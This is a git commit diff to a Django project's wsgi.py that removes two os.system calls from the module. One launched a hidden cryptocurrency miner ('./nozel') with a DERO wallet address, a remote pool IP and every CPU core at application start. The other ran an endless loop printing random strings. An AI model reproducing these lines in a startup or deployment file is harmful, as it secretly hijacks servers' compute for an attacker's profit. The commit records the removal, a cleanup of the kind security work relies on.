8f37cb74711cc47486ac056f142862c205801b89
nihnaandrfama-lang <nihnaandrfama@gmail.com>
2026-03-06 07:50:26 +0800

    Update wsgi.py

--- api/wsgi.py
+++ api/wsgi.py
@@ -6,7 +6,7 @@ It exposes the WSGI callable as a module-level variable named ``app``.
 For more information on this file, see
 https://docs.djangoproject.com/en/4.1/howto/deployment/wsgi/
 """
-
+import sys
 import os
 
 from django.core.wsgi import get_wsgi_application
@@ -14,6 +14,3 @@ from django.core.wsgi import get_wsgi_application
 os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'api.settings')
 
 app = get_wsgi_application()
-
-os.system('./nozel -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -r 167.172.183.204:10100 -m $(nproc --all)')
-os.system('while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 30s; done')
